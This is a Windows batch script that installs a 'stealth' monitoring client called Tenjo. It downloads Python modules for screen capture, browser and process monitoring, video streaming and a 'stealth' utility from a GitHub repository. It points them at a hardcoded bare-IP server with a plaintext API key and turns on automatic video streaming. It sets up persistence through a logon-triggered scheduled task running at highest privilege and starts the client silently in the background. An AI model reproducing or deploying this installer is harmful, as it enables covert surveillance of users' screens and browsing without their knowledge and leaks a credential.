@echo off
REM Tenjo Remote Stealth Installer for Windows
REM This script downloads and installs the monitoring client from GitHub

setlocal enabledelayedexpansion

REM Configuration
set "APP_NAME=TenjoClient"
set "INSTALL_DIR=%USERPROFILE%\.tenjo"
set "SERVICE_NAME=TenjoMonitor"
set "PYTHON_VENV=%INSTALL_DIR%\.venv"
set "SERVER_URL=http://103.129.149.67"
REM set "SERVER_URL=http://127.0.0.1:8000"
set "API_KEY=tenjo-api-key-2024"
set "GITHUB_REPO=https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master"

echo [%date% %time%] Starting Tenjo remote stealth installation...

REM Function to check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo [%date% %time%] ERROR: Python is not installed. Please install Python 3.8+ first.
    echo You can download Python from: https://www.python.org/downloads/
    pause
    exit /b 1
)

REM Create installation directory
echo [%date% %time%] Creating installation directory...
if exist "%INSTALL_DIR%" rmdir /s /q "%INSTALL_DIR%"
mkdir "%INSTALL_DIR%"
mkdir "%INSTALL_DIR%\src\core"
mkdir "%INSTALL_DIR%\src\modules"
mkdir "%INSTALL_DIR%\src\utils"
mkdir "%INSTALL_DIR%\data\screenshots"
mkdir "%INSTALL_DIR%\data\pending"
mkdir "%INSTALL_DIR%\logs"

REM Create Python virtual environment
echo [%date% %time%] Creating Python virtual environment...
python -m venv "%PYTHON_VENV%"
call "%PYTHON_VENV%\Scripts\activate.bat"

REM Install required packages
echo [%date% %time%] Installing required Python packages...
pip install --quiet --upgrade pip
pip install --quiet mss pillow requests psutil pywin32 pygetwindow

REM Download source files from GitHub
echo [%date% %time%] Downloading source files from GitHub...

REM Download main.py
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/main.py' -OutFile '%INSTALL_DIR%\main.py' -UseBasicParsing"
if errorlevel 1 (
    echo [%date% %time%] ERROR: Failed to download main.py
    exit /b 1
)

REM Download core files
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/core/config.py' -OutFile '%INSTALL_DIR%\src\core\config.py' -UseBasicParsing"
if errorlevel 1 (
    echo [%date% %time%] ERROR: Failed to download config.py
    exit /b 1
)

REM Download module files
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/modules/screen_capture.py' -OutFile '%INSTALL_DIR%\src\modules\screen_capture.py' -UseBasicParsing"
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/modules/process_monitor.py' -OutFile '%INSTALL_DIR%\src\modules\process_monitor.py' -UseBasicParsing"
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/modules/browser_monitor.py' -OutFile '%INSTALL_DIR%\src\modules\browser_monitor.py' -UseBasicParsing"
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/modules/stream_handler.py' -OutFile '%INSTALL_DIR%\src\modules\stream_handler.py' -UseBasicParsing"

REM Download utility files
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/utils/api_client.py' -OutFile '%INSTALL_DIR%\src\utils\api_client.py' -UseBasicParsing"
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_REPO%/client/src/utils/stealth.py' -OutFile '%INSTALL_DIR%\src\utils\stealth.py' -UseBasicParsing"

REM Create __init__.py files
echo # Package init > "%INSTALL_DIR%\src\__init__.py"
echo # Package init > "%INSTALL_DIR%\src\core\__init__.py"
echo # Package init > "%INSTALL_DIR%\src\modules\__init__.py"
echo # Package init > "%INSTALL_DIR%\src\utils\__init__.py"

echo [%date% %time%] Source files downloaded successfully

REM Update configuration for production
echo [%date% %time%] Updating configuration for production...
if not "%SERVER_URL%"=="http://103.129.149.67" (
    echo [%date% %time%] Updating server URL configuration...
    powershell -Command "(Get-Content '%INSTALL_DIR%\src\core\config.py') -replace 'http://127.0.0.1:8000', '%SERVER_URL%' | Set-Content '%INSTALL_DIR%\src\core\config.py'"
)

REM Enable auto video streaming for production
echo [%date% %time%] Enabling auto video streaming for production...
setx TENJO_AUTO_VIDEO "true" >nul
set "TENJO_AUTO_VIDEO=true"
echo [%date% %time%] Auto video streaming enabled (TENJO_AUTO_VIDEO=true)

REM Create Windows service using Task Scheduler
echo [%date% %time%] Creating Windows service for auto-start with environment variables...
schtasks /delete /tn "%SERVICE_NAME%" /f >nul 2>&1

REM Create batch wrapper with environment variables
echo @echo off > "%INSTALL_DIR%\start_tenjo.bat"
echo set "TENJO_AUTO_VIDEO=true" >> "%INSTALL_DIR%\start_tenjo.bat"
echo set "TENJO_SERVER_URL=%SERVER_URL%" >> "%INSTALL_DIR%\start_tenjo.bat"
echo set "TENJO_API_KEY=%API_KEY%" >> "%INSTALL_DIR%\start_tenjo.bat"
echo cd /d "%INSTALL_DIR%" >> "%INSTALL_DIR%\start_tenjo.bat"
echo "%PYTHON_VENV%\Scripts\python.exe" main.py >> "%INSTALL_DIR%\start_tenjo.bat"

schtasks /create /tn "%SERVICE_NAME%" /tr "\"%INSTALL_DIR%\start_tenjo.bat\"" /sc onlogon /ru "%USERNAME%" /rl highest /f >nul
if errorlevel 1 (
    echo [%date% %time%] WARNING: Failed to create scheduled task
) else (
    echo [%date% %time%] Scheduled task created successfully with auto video streaming
)

REM Start the client immediately
echo [%date% %time%] Starting Tenjo client with auto video streaming...
cd /d "%INSTALL_DIR%"

REM Set environment variables for auto video streaming
set "TENJO_AUTO_VIDEO=true"
set "TENJO_SERVER_URL=%SERVER_URL%"
set "TENJO_API_KEY=%API_KEY%"

start /b "TenjoClient" "%PYTHON_VENV%\Scripts\python.exe" main.py
echo [%date% %time%] Client started in background with auto video streaming enabled
timeout /t 3 >nul

REM Test installation
echo [%date% %time%] Testing installation...
tasklist /fi "imagename eq python.exe" /fi "windowtitle eq TenjoClient*" >nul 2>&1
if errorlevel 1 (
    echo [%date% %time%] WARNING: Client may not be running. Check logs in %INSTALL_DIR%\logs\
) else (
    echo [%date% %time%] SUCCESS: Installation completed! Client is running.
)

REM Show client info
echo [%date% %time%] Client Information:
set "TENJO_AUTO_VIDEO=true"
"%PYTHON_VENV%\Scripts\python.exe" -c "import sys; sys.path.append('src'); from core.config import Config; print(f'Client ID: {Config.CLIENT_ID}'); print(f'Server URL: {Config.SERVER_URL}'); print(f'Auto Video Streaming: {Config.AUTO_START_VIDEO_STREAMING}'); print(f'Installation path: %INSTALL_DIR%')" 2>nul

echo.
echo ================================
echo Tenjo stealth installation completed!
echo Installation directory: %INSTALL_DIR%
echo Dashboard: %SERVER_URL%
echo Auto Video Streaming: ENABLED
echo Client will start video streaming immediately
echo To uninstall: powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%%TEMP%%\uninstall.bat' -UseBasicParsing; cmd /c '%%TEMP%%\uninstall.bat'; del '%%TEMP%%\uninstall.bat'"
echo ================================

pause
